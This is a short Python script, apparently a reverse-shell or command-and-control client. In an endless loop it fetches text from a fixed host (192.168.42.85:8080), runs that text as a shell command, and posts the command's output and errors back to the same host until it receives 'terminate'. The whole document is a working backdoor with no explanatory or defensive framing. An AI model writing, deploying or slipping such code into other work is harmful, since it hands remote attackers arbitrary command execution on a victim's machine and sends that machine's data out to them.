import requests
import subprocess
import time
import os 

while True:
    req = requests.get("http://192.168.42.85:8080")
    command = req.text
    if 'terminate' in command:
        break
    
    else:
        cmd = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_response = requests.post(url="http://192.168.42.85:8080",data=cmd.stdout.read())
        post_response = requests.post(url="http://192.168.42.85:8080",data=cmd.stderr.read())
    time.sleep(3)
